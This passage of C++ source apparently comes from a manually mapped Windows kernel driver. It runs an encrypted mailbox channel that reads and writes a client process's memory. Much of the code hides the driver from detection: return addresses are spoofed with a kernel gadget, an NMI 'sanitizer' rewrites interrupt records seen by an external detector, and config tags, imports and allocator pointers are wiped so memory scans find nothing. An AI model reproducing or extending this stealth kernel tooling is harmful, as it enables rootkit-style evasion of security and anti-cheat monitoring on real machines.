                          (PostboxPeriodMs <= 100u ? 10u : 50u));
    }
#ifdef STACK_SPOOF
    if (!(Ctx && Ctx->Event))
        g_PostboxApiShadow = 0;
#endif
}

// The poll body. The caller has already attached the worker to MailboxProcess and
// holds its reference; this routine must not dereference it.
static void PostboxPollAttached(void* MailboxProcess)
{
    const uint64_t MailboxVa = PostboxStatePtr->MailboxVa;
    if (!MailboxVa) return;

    PostboxKeyGuard KeyGuard;

    // The stage and process pointers live in the detached KFWk block, not in
    // the state page. Keep the stage address in a local for the poll body.
    PostboxWorkContext* const W = PostboxCtx(PostboxStatePtr);
    if (!W || !W->Stage) return;
    uint8_t* const Stage = W->Stage;

    PostboxHeader Sealed{};
    if (!PostboxCopySpoof(MailboxProcess, (address) MailboxVa, &Sealed, sizeof(Sealed), false))
    {
        PostboxWipe(&Sealed, sizeof(Sealed));
        PostboxDeadTick();
        PostboxIdleTick();
        return;
    }

    // the whole control block is sealed, so the sequence cannot
    // be read before decryption. Try the expected request nonce first; a
    // same-Seq idle response is opened with the last nonce below.
    PostboxHeader Plain = Sealed;
    bool Candidate;
    {
        PostboxKeyUse Use(KeyGuard);
        Candidate = pb::OpenRequestHeader(reinterpret_cast<uint8_t*>(&Plain),
                                          Use.Keys,
                                          PostboxStatePtr->SessionId,
                                          PostboxStatePtr->LastNonce + 1);
    }
    if (!Candidate)
    {
        PostboxHeader Idle = Sealed;
        bool IdleOpened;
        {
            PostboxKeyUse Use(KeyGuard);
            IdleOpened = pb::OpenRequestHeader(reinterpret_cast<uint8_t*>(&Idle),
                                               Use.Keys,
                                               PostboxStatePtr->SessionId,
                                               PostboxStatePtr->LastNonce);
        }
        if (IdleOpened &&
            Idle.SessionId == PostboxStatePtr->SessionId &&
            Idle.Seq == PostboxStatePtr->LastSeq &&
            Idle.Nonce == PostboxStatePtr->LastNonce &&
            Idle.Ack == PostboxStatePtr->LastSeq)
        {
            PostboxDeadReset();
            PostboxIdleTick();
            PostboxWipe(&Idle, sizeof(Idle));
            PostboxWipe(&Sealed, sizeof(Sealed));
            return;
        }
        if (PostboxStatePtr->AuthFailures != 0xFFFFFFFFu) ++PostboxStatePtr->AuthFailures;
        PostboxWipe(&Plain, sizeof(Plain));
        PostboxWipe(&Sealed, sizeof(Sealed));
        PostboxDeadTick();
        PostboxIdleTick();
        return;
    }

    const uint32_t Seq = Plain.Seq;
    // Keep the authenticated scalars off the spoofed stack frame; nested
    // PostboxCopySpoof calls must not be able to perturb the values used for
    // the re-read/response checks.
    const uint64_t Nonce = Plain.Nonce;
    const uint64_t BufferVa = Plain.BufferVa;
    const bool SameSeq = (static_cast<int32_t>(Seq - PostboxStatePtr->LastSeq) == 0);
    const PostboxSeqVerdict SeqVerdict = PostboxSequenceVerdict(
        Seq, PostboxStatePtr->LastSeq, Plain.SessionId, PostboxStatePtr->SessionId,
        Nonce, PostboxStatePtr->LastNonce, Plain.Ack);

    if (SeqVerdict == PostboxSeqVerdict::Reject)
    {
        PostboxDeadTick();
        PostboxIdleTick();
        PostboxWipe(&Plain, sizeof(Plain));
        PostboxWipe(&Sealed, sizeof(Sealed));
        return;
    }
    if (SeqVerdict == PostboxSeqVerdict::Idle)
    {
        PostboxDeadReset();
        PostboxIdleTick();
        PostboxWipe(&Plain, sizeof(Plain));
        PostboxWipe(&Sealed, sizeof(Sealed));
        return;
    }
    if (SeqVerdict == PostboxSeqVerdict::AuthFailure || Nonce != PostboxStatePtr->LastNonce + 1)
    {
        if (PostboxStatePtr->AuthFailures != 0xFFFFFFFFu) ++PostboxStatePtr->AuthFailures;
        PostboxDeadTick();
        PostboxIdleTick();
        PostboxWipe(&Plain, sizeof(Plain));
        PostboxWipe(&Sealed, sizeof(Sealed));
        return;
    }

    const uint32_t Op = Plain.Op;
    const uint32_t Size = Plain.Size;
    const uint64_t Address = Plain.Address;
    const bool KnownOp = Op == pb_ping || Op == pb_read || Op == pb_write || Op == pb_stop
#ifdef POSTBOX_NMI
                         || Op == pb_nmi
#endif
#ifdef NMI_PROBE
                         || Op == pb_nmi_probe
                         || Op == pb_nmi_status
#endif
#ifdef STACK_PROBE
                         || Op == pb_stack_probe
#endif
                         ;
    const bool ZeroBodyOp = Op == pb_ping || Op == pb_stop || Op == pb_nmi
#ifdef NMI_PROBE
                            || Op == pb_nmi_probe
                            || Op == pb_nmi_status
#endif
#ifdef STACK_PROBE
                            || Op == pb_stack_probe
#endif
                            ;
    if (!PostboxRequestShapeOk(KnownOp, ZeroBodyOp, Op, Size, StageBytes, SameSeq))
    {
        PostboxWipe(&Plain, sizeof(Plain));
        PostboxWipe(&Sealed, sizeof(Sealed));
        PostboxDeadTick();
        PostboxIdleTick();
        return;
    }

    const uint32_t BodyLen = PostboxRequestBodyLen(Op, Size);
    const uint32_t BodyBytes = (Op == pb_read || Op == pb_write) ? Size :
                               (Op == pb_nmi) ? (uint32_t) sizeof(uint64_t) :
#ifdef NMI_PROBE
                               (Op == pb_nmi_probe) ? (uint32_t) sizeof(PostboxNmiProbeResult) :
                               (Op == pb_nmi_status) ? (uint32_t) sizeof(PostboxNmiStatus) :
#endif
#ifdef STACK_PROBE
                               (Op == pb_stack_probe) ? (uint32_t) sizeof(PostboxStackProbeResult) :
#endif
                               0;

    const address DataVa = (address) BufferVa;
    if (BodyLen != 0 &&
        !PostboxCopySpoof(MailboxProcess, DataVa, Stage, BodyLen, false))
    {
        PostboxWipe(&Plain, sizeof(Plain));
        PostboxWipe(&Sealed, sizeof(Sealed));
        PostboxWipe(Stage, BodyLen);
        PostboxDeadTick();
        PostboxIdleTick();
        return;
    }

    uint8_t Tag[16];
    {
        PostboxKeyUse Use(KeyGuard);
        pb::MacRequestTag(Tag, Use.Keys, PostboxStatePtr->SessionId, Seq, Nonce, Op,
                          reinterpret_cast<const uint8_t*>(&Sealed), Stage, BodyLen);
    }
    if (!pb::Mac128Equal(Tag, Sealed.Mac))
    {
        if (PostboxStatePtr->AuthFailures != 0xFFFFFFFFu) ++PostboxStatePtr->AuthFailures;
        PostboxWipe(&Plain, sizeof(Plain));
        PostboxWipe(&Sealed, sizeof(Sealed));
        PostboxWipe(Stage, BodyLen);
        PostboxDeadTick();
        PostboxIdleTick();
        return;
    }

    // Authenticated. Consume the sequence/nonce before any response write: if the response
    // is lost, the client's next request is Seq + 1 and must not look like a replay.
    PostboxStatePtr->LastSeq = Seq;
    PostboxStatePtr->LastNonce = Nonce;
    PostboxDeadReset();
    PostboxIdleMs = 0;
    // Keep the 4 ms cadence only while the NMI sanitizer needs it. A normal
    // request/response channel is responsive enough at 64 ms and does 16x fewer
    // worker/DPC context switches during an active hold.
    uint32_t ActiveMs = 64;
#ifdef NMI_SANITIZE
    if (PostboxStatePtr->NmiSanitize.Active) ActiveMs = 4;
#endif
    // The event trigger owns the wakeups once it is started. The first ping
    // with an event handle starts it after this response, so do not arm a
    // one-shot for that request either: a queued item would race the event
    // thread and enter the work entry with no valid target.
    {
        PostboxWorkContext* const Ctx = PostboxCtx(PostboxStatePtr);
        const bool EventActive = Ctx && (Ctx->Event || Ctx->EventThread);
        const bool StartsEvent = (Op == pb_ping && Address != 0);
        if (!EventActive && !StartsEvent && PostboxPeriodMs != ActiveMs)
        {
            PostboxPeriodMs = ActiveMs;
            (void) PostboxArm(ActiveMs, ActiveMs <= 8u ? 1u : 10u);
        }
    }

    int32_t Status = 0;
    const uint8_t* ResponseBody = nullptr;
    uint32_t ResponseLen = 0;

    // Stage already holds the body when Body is null (the read path).
    auto SealResponse = [&](const void* Body, uint32_t Len)
    {
        if (Body) __builtin_memcpy(Stage, Body, Len);
        {
            PostboxKeyUse Use(KeyGuard);
            pb::SealResponseBody(Stage, Len, Use.Keys, PostboxStatePtr->SessionId, Nonce);
        }
        ResponseBody = Stage;
        ResponseLen = Len;
    };

    if (Op == pb_read || Op == pb_write)
    {
        // The prototype is self-process only: the target is the mailbox owner. This keeps
        // the channel from becoming an arbitrary-process R/W primitive for anyone who can
        // write the mailbox. Cross-process access needs an allowlist. The range and
        // header-overlap rules live in Common/Postbox.h (PostboxRequestRangeOk).
        if (!PostboxRequestRangeOk(Op, Size, Address, BufferVa, MailboxVa, StageBytes))
        {
            Status = (int32_t) 0xC000000D;          // STATUS_INVALID_PARAMETER
        }
        else if (Op == pb_write)
        {
            {
                PostboxKeyUse Use(KeyGuard);
                pb::OpenRequestBody(Stage, Size, Use.Keys, PostboxStatePtr->SessionId, Nonce);
            }
            const bool Ok = PostboxCopySpoof(MailboxProcess, (address) Address,
                                        Stage, Size, true);
            Status = Ok ? 0 : (int32_t) 0xC0000005;
            PostboxWipe(Stage, Size);
        }
        else
        {
            const bool Ok = PostboxCopySpoof(MailboxProcess, (address) Address,
                                        Stage, Size, false);
            if (Ok)
                SealResponse(nullptr, Size);
            else
            {
                Status = (int32_t) 0xC0000005;      // STATUS_ACCESS_VIOLATION
            }
        }
    }
#ifdef POSTBOX_NMI
    else if (Op == pb_nmi)
    {
        const uint32_t Mode = (uint32_t) (Address & 0xFF);
        const uint32_t Storm = (uint32_t) (Address >> 32);
        if (Mode > 3 || (Mode == 3 && Storm > 20000))
        {
            Status = (int32_t) 0xC000000D;          // STATUS_INVALID_PARAMETER
        }
        else
        {
            uint64_t NmiCount = PostboxNmiCount();
            if (Mode >= 1)
            {
                // Transient gate: install, run the self-IPI test, restore the Windows
                // IDT in the same work item. No private IDTR survives the request, so
                // a failed timer/NMI path cannot leave an unremovable gate behind.
                // Mode 2 holds the gate ~15 s for external chained NMIs; mode 3 sends
                // a chained self-NMI storm (pending flag clear), so the chain path is
                // exercised deterministically with no external NMI source. Modes 2/3
                // return the stub's tick count (every NMI seen, chained or consumed).
                uint64_t After = 0;
                if (!PostboxNmiInstall())
                {
                    Status = (int32_t) 0xC0000001;  // STATUS_UNSUCCESSFUL
                }
                else
                {
                    if (Mode == 2)
                    {
                        _LARGE_INTEGER Hold{};
                        Hold.QuadPart = -10 * 10000;            // 10 ms
                        for (uint32_t i = 0; i < 6000; ++i)     // ~60 s
                            ((FnKeDelayExecutionThread) g_KeDelayExecutionThread)(
                                0, 0, &Hold);
                    }
                    else if (Mode == 3)
                    {
                        const uint32_t Count = Storm ? Storm : 500;
                        PostboxNmiStorm(Count);
                    }
                    const bool Ok = PostboxNmiSelfTest(&After);
                    // Snapshot before uninstall: quiesce/zero clears the counters,
                    // which made the earlier hold response always report 0.
                    const uint64_t TicksAfter = PostboxNmiCount();
                    PostboxNmiUninstall();
                    if (Ok)
                        NmiCount = (Mode == 2 || Mode == 3) ? TicksAfter : After;
                    else
                        Status = (int32_t) 0xC0000001;
                }
            }
            if (Status == 0)
                SealResponse(&NmiCount, sizeof(NmiCount));
        }
    }
#endif

#ifdef NMI_PROBE
    else if (Op == pb_nmi_probe)
    {
        if (Address != 0)
        {
            // Test-only mapped-code window for an external detector.
            PostboxNmiSpin((uint32_t) Address);
            Status = 0;
        }
        else
        {
            PostboxNmiProbeResult Result{};
            const uint32_t Probe = PostboxNmiProbe(&Result);
            if (Probe != 0)
            {
                Status = (int32_t) (0xC0001000u | Probe);
            }
            else
            {
                SealResponse(&Result, sizeof(Result));
            }
        }
    }
    else if (Op == pb_nmi_status)
    {
        // Test-only: report sanitizer activation and the last record rewrite.
        PostboxNmiStatus St{};
        St.Magic = PostboxNmiStatusMagic;
        St.Active = PostboxStatePtr->NmiSanitize.Active;
        St.Ready = PostboxStatePtr->NmiSanitize.Ready;
        St.DetectorBase = PostboxStatePtr->NmiSanitize.DetectorBase;
        St.DetectorSize = PostboxStatePtr->NmiSanitize.DetectorSize;
        St.Writes = PostboxStatePtr->NmiSanitize.Writes;
        St.LastCount = PostboxStatePtr->NmiSanitize.LastCount;
        St.LastUser = PostboxStatePtr->NmiSanitize.LastUser;
        St.LastCore = PostboxStatePtr->NmiSanitize.LastCore;
        St.LastRip = PostboxStatePtr->NmiSanitize.LastRip;
        St.LastRsp = PostboxStatePtr->NmiSanitize.LastRsp;
        // Test-only: report whether the nt work-entry thunk was selected and
        // its address. RefreshActive/RefreshRun are leftover ABI slots now that
        // refresh runs on the worker.
        St.RefreshActive = PostboxStatePtr->WorkJump ? 1 : 0;
        St.RefreshRun = PostboxStatePtr->WorkJump;
        St.RefreshCount = PostboxStatePtr->NmiSanitize.RefreshCount;
        St.ListHead = PostboxStatePtr->NmiSanitize.ListHead;
        St.NtBase = PostboxStatePtr->NmiSanitize.NtBase;
        St.NtSize = PostboxStatePtr->NmiSanitize.NtSize;
        St.PsLoadedModuleList = PostboxStatePtr->Caches.PsLoadedModuleList;
        St.ApcNeutralized = PostboxStatePtr->NmiSanitize.ApcNeutralized;
        St.ThreadStartSpoofed = PostboxStatePtr->NmiSanitize.ThreadStartSpoofed;
        St.DpcDeferredRoutine = (uint64_t) (uintptr_t)
            PostboxCtx(PostboxStatePtr)->Dpc.DeferredRoutine;
        St.DpcDeferredContext = (uint64_t) (uintptr_t)
            PostboxCtx(PostboxStatePtr)->Dpc.DeferredContext;
        St.DpcEntry = (uint64_t) (uintptr_t)
            PostboxCtx(PostboxStatePtr)->QueueWork.WorkerRoutine;
        SealResponse(&St, sizeof(St));
    }
#endif

#ifdef STACK_PROBE
    else if (Op == pb_stack_probe)
    {
        PostboxStackProbeResult Result{};
        const bool ProbeOk = g_PostboxShadowActive
            ? PostboxSpoofInvoke<bool>((uint64_t) (uintptr_t) &PostboxStackProbeRun,
                                       MailboxProcess, DataVa, &Result)
            : PostboxStackProbeRun(MailboxProcess, DataVa, &Result);
        if (!ProbeOk)
        {
            Status = (int32_t) 0xC0000001;      // STATUS_UNSUCCESSFUL
        }
        else
        {
            SealResponse(&Result, sizeof(Result));
        }
    }
#endif

    // Do not publish a response body after the client has moved on. This narrows the
    // timeout/body-overwrite race; the stage keeps the MAC and the published bytes identical.
    // Zero-body ops cannot overwrite a body, and the re-read is the
    // path that currently sees the spoofed frame's transient state; skip it for them.
    PostboxHeader CurrentSealed{};
    PostboxHeader Current{};
    auto AbortRecheck = [&]()
    {
        PostboxWipe(&Current, sizeof(Current));
        PostboxWipe(&CurrentSealed, sizeof(CurrentSealed));
        PostboxWipe(&Plain, sizeof(Plain));
        PostboxWipe(&Sealed, sizeof(Sealed));
        PostboxWipe(Stage, BodyBytes);
    };
    if (Op == pb_read || Op == pb_write)
    {
    if (!PostboxCopySpoof(MailboxProcess, (address) MailboxVa, &CurrentSealed,
                          sizeof(CurrentSealed), false))
    {
        AbortRecheck();
        return;
    }
    bool CurrentOpened;
    {
        PostboxKeyUse Use(KeyGuard);
        CurrentOpened = pb::OpenRequestHeader(reinterpret_cast<uint8_t*>(&Current),
                                              Use.Keys, PostboxStatePtr->SessionId,
                                              Nonce);
    }
    if (!CurrentOpened)
    {
        AbortRecheck();
        return;
    }
    if (Current.Seq != Seq || Current.Nonce != Nonce)
    {
        AbortRecheck();
        return;
    }
    }

    const void* EventHandle = (Op == pb_ping && Plain.Address)
                                  ? (void*) (uintptr_t) Plain.Address : nullptr;
    (void) PostboxRespond(PostboxStatePtr->MailboxVa, BufferVa, MailboxProcess, Seq, Nonce, Op,
                          Status, ResponseBody, ResponseLen, KeyGuard);
    PostboxWipe(Stage, BodyBytes);
#ifndef POSTBOX_NMI_ALLOW_MAPPED_CALLBACK
    if (EventHandle)
    {
#ifdef POSTBOX_EVENT_START
        (void) PostboxAdoptEvent((void*) EventHandle);
#else
        (void) PostboxStartEventThread((void*) EventHandle);
#endif
    }
#endif

    if (Op == pb_stop)
    {
        // The stop is authenticated and acknowledged; now cancel. The work item clears
        // PostboxInFlight on its way out, so do not wait here.
        PostboxCancel();
        PostboxFreeStage();
        PostboxFreeState();
        // Finish every state-page write before the reaper can free the page.
        PostboxStatePtr->SessionId = 0;
        PostboxStatePtr->LastNonce = 0;
        PostboxStartReaper();
    }

    PostboxWipe(&Plain, sizeof(Plain));
    PostboxWipe(&Sealed, sizeof(Sealed));
}

// Poll body call through the generic trampoline. PostboxPollAttached's mapped
// return address is replaced by the nt gadget while it runs.
static void PostboxPollAttachedSpoof(void* MailboxProcess)
{
#ifdef STACK_SPOOF
    if (g_PostboxPopRspRetSkip)
    {
        PostboxSpoofInvoke<void>((uint64_t) (uintptr_t) &PostboxPollAttached,
                                 MailboxProcess);
        return;
    }
#endif
    PostboxPollAttached(MailboxProcess);
}

// Poll entry: the worker uses the cached client EPROCESS; the process exit
// synchronization is held for the whole channel lifetime. The poll attaches once
// around the poll body and detaches afterwards.
static void PostboxPoll()
{
    if (__atomic_load_n(&PostboxPollTeardown, __ATOMIC_ACQUIRE)) return;
    __atomic_add_fetch(&PostboxPollRefs, 1, __ATOMIC_ACQ_REL);
    if (__atomic_load_n(&PostboxPollTeardown, __ATOMIC_ACQUIRE) ||
        !__atomic_load_n(&PostboxRunning, __ATOMIC_ACQUIRE))
    {
        __atomic_sub_fetch(&PostboxPollRefs, 1, __ATOMIC_ACQ_REL);
        return;
    }

    if (!PostboxStatePtr || !PostboxStatePtr->MailboxVa)
    {
        // A zeroed/corrupted state must not leave the fast timer armed forever:
        // the dead-client watchdog is bypassed by this early return, and a manual
        // map has no unload callback. Cancel and wipe here (PASSIVE, work routine).
        PostboxCancel();
        PostboxFreeStage();
        PostboxFreeState();
        // Finish every state-page write before the reaper can free the page.
        PostboxStatePtr->SessionId = 0;
        PostboxStatePtr->LastNonce = 0;
        __atomic_sub_fetch(&PostboxPollRefs, 1, __ATOMIC_ACQ_REL);
        PostboxMaybeReleaseProcess();
        PostboxStartReaper();
        return;
    }

    // The EPROCESS reference and create-time check were done once in PostboxStart.
    // The pointer lives in the KFWk block, not the state page.
    PostboxWorkContext* const Ctx = PostboxCtx(PostboxStatePtr);
    void* Process = Ctx ? Ctx->Process : nullptr;
    if (!Process)
    {
        PostboxDeadTick();
        PostboxIdleTick();
        __atomic_sub_fetch(&PostboxPollRefs, 1, __ATOMIC_ACQ_REL);
        PostboxMaybeReleaseProcess();
        return;
    }

    // One explicit attach per poll under the lifetime exit synchronization. The
    // MmCopyVirtualMemory calls inside the poll see the client as current and
    // skip their internal attach, so request paths do not attach once per copy.
    PostboxApcState ApcState{};
    PostboxAttachProcess(Process, &ApcState);
    PostboxPollAttachedSpoof(Process);
    PostboxDetachProcess(&ApcState);
    __atomic_sub_fetch(&PostboxPollRefs, 1, __ATOMIC_ACQ_REL);
    PostboxMaybeReleaseProcess();
}

// Starts the channel from a loader-supplied config. PASSIVE_LEVEL (DriverEntry).
bool PostboxStart(const PostboxConfig* Config)
{
    PostboxStartFailure = 30;
    PostboxPollRefs = 0;
    PostboxPollTeardown = false;

    if (__atomic_load_n(&PostboxRunning, __ATOMIC_ACQUIRE)) return true;

    // Validate the whole config BEFORE any kernel work (in particular before
    // MemSetPreStartNtoskrnl resolves the ntoskrnl exports). PostboxConfigValid
    // is shared with the host unit tests and preserves the PostboxStartFailure
    // entry code for an invalid config.
    if (!Config) return false;
    uint32_t ConfigError = 0;
    if (!PostboxConfigValid(*Config, &ConfigError))
    {
        if (ConfigError) PostboxStartFailure = ConfigError;
        return false;
    }
    MemSetPreStartNtoskrnl(Config->Layout.NtoskrnlBase);

    // A previous start may have left the page resident (watchdog/stop). Never
    // overwrite the only pointer: free it first when no worker is in flight. The
    // old page carries its own free helper, so this works after the raw slots were
    // zeroed at the end of the previous start.
    if (PostboxStatePtr)
    {
        if (__atomic_load_n(&PostboxInFlight, __ATOMIC_ACQUIRE) != 0)
            return false;
        PostboxReleaseProcess();
        PostboxFreeStatePage();
    }

    g_MmAllocateIndependentPages_Raw = (address) Config->MmAllocateIndependentPages;
    g_MmSetPageProtection_Raw = (address) Config->MmSetPageProtection;
    g_MmFreeIndependentPages_Raw = (address) Config->MmFreeIndependentPages;

    PostboxStatePtr = (PostboxState*) ((FnMmAllocateIndependentPages)
        g_MmAllocateIndependentPages_Raw)(0x2000, 0xFFFFFFFF, 0, 0);
    if (!PostboxStatePtr)
    {
        g_MmAllocateIndependentPages_Raw = 0;
        g_MmSetPageProtection_Raw = 0;
        g_MmFreeIndependentPages_Raw = 0;
        return false;
    }
    if (!((FnMmSetPageProtection) g_MmSetPageProtection_Raw)(
            PostboxStatePtr, 0x2000, 0x04 /* PAGE_READWRITE */))
    {
        ((FnMmFreeIndependentPages) g_MmFreeIndependentPages_Raw)(PostboxStatePtr, 0x2000);
        PostboxStatePtr = nullptr;
        g_MmAllocateIndependentPages_Raw = 0;
        g_MmSetPageProtection_Raw = 0;
        g_MmFreeIndependentPages_Raw = 0;
        return false;
    }
    PostboxWipe(PostboxStatePtr, 0x2000);
    // C-01: move the pre-protection ntoskrnl/PTE/Pfn caches into the state page
    // and clear their .data slots before any later lookup runs.
    MemAdoptCaches(&PostboxStatePtr->Caches);
    // single nt-base anchor for the RVA import table. Kept outside
    // Caches because PostboxFreeState wipes the cache copy while the reaper
    // still needs to resolve teardown helpers.
    PostboxStatePtr->ImportBase = PostboxStatePtr->Caches.Ntoskrnl;

    // The page owns the three helpers now. Copy them before any failure path can
    // reach PostboxFreeStatePage, then zero the .data slots so a static .data scan
    // finds no page-allocator pointer after start.
    PostboxStatePtr->Imports.MmAllocateIndependentPages =
        PostboxRva(g_MmAllocateIndependentPages_Raw);
    PostboxStatePtr->Imports.MmSetPageProtection =
        PostboxRva(g_MmSetPageProtection_Raw);
    PostboxStatePtr->Imports.MmFreeIndependentPages =
        PostboxRva(g_MmFreeIndependentPages_Raw);
    g_MmAllocateIndependentPages_Raw = 0;
    g_MmSetPageProtection_Raw = 0;
    g_MmFreeIndependentPages_Raw = 0;

    PostboxStatePtr->Cfg = *Config;
    // B-01: the poll needs the mailbox VA; keep it outside the Cfg copy, which is
    // wiped as soon as start has consumed Pid/CreateTime.
    PostboxStatePtr->MailboxVa = Config->MailboxVa;
    PostboxStatePtr->Cfg.MmAllocateIndependentPages = 0;
    PostboxStatePtr->Cfg.MmSetPageProtection = 0;
    PostboxStatePtr->Cfg.MmFreeIndependentPages = 0;
    // The magic/version are validation-only. Leaving the 8-byte config tag plus
    // version in .data makes the resident control block trivially findable by a
    // magic scan; wipe it after the check.
    PostboxStatePtr->Cfg.Magic = 0;
    PostboxStatePtr->Cfg.Version = 0;
    // The reaper frees the loader allocation, not the aligned image base. Save
    // RawBase/AllocSize in the state page (not .data) before the layout copy is
    // wiped. The Config.Reserved gate above guarantees the independent layout.
    PostboxStatePtr->ReaperBase = Config->Layout.RawBase;
    PostboxStatePtr->ReaperSize = Config->Layout.AllocSize;
#ifdef NMI_SANITIZE
    // Capture the mapped image range for the NMI frame trampoline before the
    // layout copy is wiped. Only the sanitizer init consumes it here; the spoof
    // and product paths read NmiSanitize.* fields instead.
    const uint64_t ImageBase = Config->Layout.ImageBase;
    const uint64_t ImageSize = Config->Layout.ImageSize;
#endif
    // The section map is only needed by ProtectImageSections(), which ran before
    // this copy. Do not leave the RVAs/sizes in the resident .data image.
    PostboxWipe(&PostboxStatePtr->Cfg.Layout, sizeof(PostboxStatePtr->Cfg.Layout));
    PostboxStatePtr->LastSeq = 0;
    PostboxStatePtr->LastNonce = 0;
    PostboxInFlight = 0;
    PostboxStatePtr->SessionId = Config->SessionId;

    uint8_t Master[32];
    for (uint32_t i = 0; i < sizeof(Master); ++i) Master[i] = Config->Key[i];
    pb::DerivePostboxKeys(&PostboxStatePtr->Keys, Master);   // wipes Master
    // Keep only the masked schedule in the resident page. Every consumer
    // unmasks a stack copy for the duration of the call.
    pb::MaskPostboxKeys(&PostboxStatePtr->Keys, PostboxStatePtr->SessionId);
    PostboxWipe(&PostboxStatePtr->Cfg.Key, sizeof(PostboxStatePtr->Cfg.Key));

    if (!PostboxResolve())
    {
        PostboxFreeStatePage();
        return false;
    }

    // Move the resolved routine table out of .data and zero the raw slots. The
    // state page already exists, so every later use goes through the macros.
    PostboxStatePtr->Imports.KeInitializeTimerEx = PostboxRva(g_KeInitializeTimerEx_Raw);
    PostboxStatePtr->Imports.KeInitializeDpc = PostboxRva(g_KeInitializeDpc_Raw);
    PostboxStatePtr->Imports.KeSetCoalescableTimer = PostboxRva(g_KeSetCoalescableTimer_Raw);
    PostboxStatePtr->Imports.KeCancelTimer = PostboxRva(g_KeCancelTimer_Raw);
    PostboxStatePtr->Imports.KeFlushQueuedDpcs = PostboxRva(g_KeFlushQueuedDpcs_Raw);
    PostboxStatePtr->Imports.ExQueueWorkItem = PostboxRva(g_ExQueueWorkItem_Raw);
    PostboxStatePtr->Imports.PsLookupProcessByProcessId = PostboxRva(g_PsLookupProcessByProcessId_Raw);
    PostboxStatePtr->Imports.ObDereferenceObject = PostboxRva(g_ObDereferenceObject_Raw);
    PostboxStatePtr->Imports.KeDelayExecutionThread = PostboxRva(g_KeDelayExecutionThread_Raw);
    PostboxStatePtr->Imports.PsGetProcessCreateTimeQuadPart = PostboxRva(g_PsGetProcessCreateTimeQuadPart_Raw);
    PostboxStatePtr->Imports.ExAllocatePoolWithTag = PostboxRva(g_ExAllocatePoolWithTag_Raw);
    PostboxStatePtr->Imports.ExFreePool = PostboxRva(g_ExFreePool_Raw);
    PostboxStatePtr->Imports.MmCopyVirtualMemory = PostboxRva(g_MmCopyVirtualMemory_Raw);
    PostboxStatePtr->Imports.PsGetCurrentProcess = PostboxRva(g_PsGetCurrentProcess_Raw);
    PostboxStatePtr->Imports.PsAcquireProcessExitSynchronization = PostboxRva(g_PsAcquireProcessExitSynchronization_Raw);
    PostboxStatePtr->Imports.PsReleaseProcessExitSynchronization = PostboxRva(g_PsReleaseProcessExitSynchronization_Raw);
    PostboxStatePtr->Imports.KeStackAttachProcess = PostboxRva(g_KeStackAttachProcess_Raw);
    PostboxStatePtr->Imports.KeUnstackDetachProcess = PostboxRva(g_KeUnstackDetachProcess_Raw);
    PostboxStatePtr->Imports.KeWaitForSingleObject = PostboxRva(g_KeWaitForSingleObject_Raw);
    PostboxStatePtr->Imports.ObReferenceObjectByHandle = PostboxRva(g_ObReferenceObjectByHandle_Raw);
    PostboxStatePtr->Imports.PsCreateSystemThreadEvent = PostboxRva(g_PsCreateSystemThreadEvent_Raw);
    PostboxStatePtr->Imports.ZwCloseEvent = PostboxRva(g_ZwCloseEvent_Raw);
    PostboxStatePtr->Imports.ExEventObjectType = PostboxRva(g_ExEventObjectType_Raw);
    PostboxStatePtr->Imports.PsTerminateSystemThread = PostboxRva(g_PsTerminateSystemThread_Raw);
#ifdef POSTBOX_KEEP_THREAD_SPOOF
    PostboxStatePtr->Imports.PsCreateSystemThread = PostboxRva(g_PsCreateSystemThread_Raw);
    PostboxStatePtr->Imports.ZwClose = PostboxRva(g_ZwClose_Raw);
#endif
    PostboxStatePtr->Imports.KeEnterCriticalRegion = PostboxRva(g_KeEnterCriticalRegion_Raw);
    PostboxStatePtr->Imports.KeLeaveCriticalRegion = PostboxRva(g_KeLeaveCriticalRegion_Raw);
#ifdef POSTBOX_KEEP_THREAD_SPOOF
    PostboxStatePtr->Imports.PsLookupThreadByThreadId = PostboxRva(g_PsLookupThreadByThreadId_Raw);
#endif
    PostboxStatePtr->Imports.KeQueryInterruptTime = PostboxRva(g_KeQueryInterruptTime_Raw);

    g_KeInitializeTimerEx_Raw = 0;
    g_KeInitializeDpc_Raw = 0;
    g_KeSetCoalescableTimer_Raw = 0;
    g_KeCancelTimer_Raw = 0;
    g_KeFlushQueuedDpcs_Raw = 0;
    g_ExQueueWorkItem_Raw = 0;
    g_PsLookupProcessByProcessId_Raw = 0;
    g_ObDereferenceObject_Raw = 0;
    g_KeDelayExecutionThread_Raw = 0;
    g_PsGetProcessCreateTimeQuadPart_Raw = 0;
    g_ExAllocatePoolWithTag_Raw = 0;
    g_ExFreePool_Raw = 0;
    g_MmCopyVirtualMemory_Raw = 0;
    g_PsGetCurrentProcess_Raw = 0;
    g_PsAcquireProcessExitSynchronization_Raw = 0;
    g_PsReleaseProcessExitSynchronization_Raw = 0;
    g_KeStackAttachProcess_Raw = 0;
    g_KeUnstackDetachProcess_Raw = 0;
    g_KeWaitForSingleObject_Raw = 0;
    g_ObReferenceObjectByHandle_Raw = 0;
    g_PsCreateSystemThreadEvent_Raw = 0;
    g_ZwCloseEvent_Raw = 0;
    g_ExEventObjectType_Raw = 0;
    g_PsTerminateSystemThread_Raw = 0;
#ifdef POSTBOX_KEEP_THREAD_SPOOF
    g_PsCreateSystemThread_Raw = 0;
    g_ZwClose_Raw = 0;
#endif
    g_KeEnterCriticalRegion_Raw = 0;
    g_KeLeaveCriticalRegion_Raw = 0;
#ifdef POSTBOX_KEEP_THREAD_SPOOF
    g_PsLookupThreadByThreadId_Raw = 0;
#endif
    g_KeQueryInterruptTime_Raw = 0;

    // Acquire the client reference and verify its create time once, not per poll.
    // Pid/CreateTime are the last config fields any path reads; keep Pid for the
    // start log, then drop the whole copy below.
    const uint32_t MailboxPid = PostboxStatePtr->Cfg.Pid;
    const uint64_t CreateTime = PostboxStatePtr->Cfg.CreateTime;
    void* Process = nullptr;
    if (PostboxLookupProcess((void*) (uintptr_t) MailboxPid, &Process) < 0 || !Process)
    {
        PostboxFreeStatePage();
        return false;
    }
    if ((uint64_t) PostboxProcessCreateTime(Process) != CreateTime)
    {
        PostboxDereferenceObject(Process);
        PostboxFreeStatePage();
        return false;
    }
    // Hold the process exit synchronization for the whole channel lifetime. The
    // poll no longer acquires/releases it per mailbox exchange; this keeps the
    // address space stable against client exit without a per-poll race. It is
    // released in PostboxReleaseProcess before the EPROCESS dereference.
    if (PostboxAcquireProcessExit(Process) < 0)
    {
        PostboxDereferenceObject(Process);
        PostboxFreeStatePage();
        return false;
    }
    PostboxStatePtr->Process = Process;
    // B-01: Pid/CreateTime were the last config fields any runtime path needs.
    // Wipe the entire copy; the poll uses MailboxVa, auth uses SessionId/Keys.
